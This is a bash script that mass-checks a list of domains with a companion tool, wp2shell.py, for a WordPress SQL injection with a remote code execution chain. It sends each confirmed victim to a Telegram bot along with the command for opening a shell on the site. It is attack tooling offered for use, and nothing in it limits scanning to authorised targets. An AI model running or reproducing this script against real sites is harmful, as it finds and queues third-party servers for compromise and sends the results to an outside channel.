#!/usr/bin/env bash
# batch-scan.sh — check domains, send confirmed vulns to Telegram

set -u

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
RESULTS_DIR="$SCRIPT_DIR/results"
TG_TOKEN="${TG_TOKEN:-}"
TG_CHAT_ID="${TG_CHAT_ID:-}"

mkdir -p "$RESULTS_DIR"

if [[ $# -lt 1 ]]; then
  echo "Usage: $0 domains.txt [workers]"
  exit 1
fi

total=$(wc -l < "$1" | tr -d ' ')
echo "[*] Checking $total domains..."
echo ""

tg_send() {
  [[ -z "$TG_TOKEN" || -z "$TG_CHAT_ID" ]] && return
  curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
    -d chat_id="$TG_CHAT_ID" \
    -d parse_mode="HTML" \
    -d text="$1" > /dev/null 2>&1
}

cat "$1" | while IFS= read -r domain || [[ -n "$domain" ]]; do
  domain="${domain%%#*}"
  domain="${domain#"${domain%%[![:space:]]*}"}"
  domain="${domain%"${domain##*[![:space:]]}"}"
  [[ -z "$domain" ]] && continue

  check_result=$(python3 "$SCRIPT_DIR/wp2shell.py" check "https://$domain" 2>&1)

  if ! echo "$check_result" | grep -q "CONFIRMED\|VULNERABLE"; then
    echo "⚪ $domain — not vulnerable"
    echo "$domain | NOT VULNERABLE" >> "$RESULTS_DIR/not-vuln.txt"
    continue
  fi

  ver=$(echo "$check_result" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -1)
  batch=$(echo "$check_result" | grep -oE 'HTTP [0-9]+' | head -1)

  echo "🔴 $domain — VULNERABLE (WP $ver)"

  tg_send "🔴 <b>VULNERABLE</b> — <code>$domain</code>

<b>Version:</b> $ver
<b>Batch:</b> $batch
<b>SQLi:</b> CONFIRMED
<b>RCE:</b> Full chain available

<i>Run manually: wp2shell.py shell https://$domain --cmd id</i>"

  echo "$domain | VULNERABLE | WP $ver | batch $batch" >> "$RESULTS_DIR/confirmed.txt"
done

echo ""
echo "[+] Done."
echo "[+] Confirmed vulnerable: $(cat "$RESULTS_DIR/confirmed.txt" 2>/dev/null | wc -l | tr -d ' ')"
echo "[+] Not vulnerable: $(cat "$RESULTS_DIR/not-vuln.txt" 2>/dev/null | wc -l | tr -d ' ')"
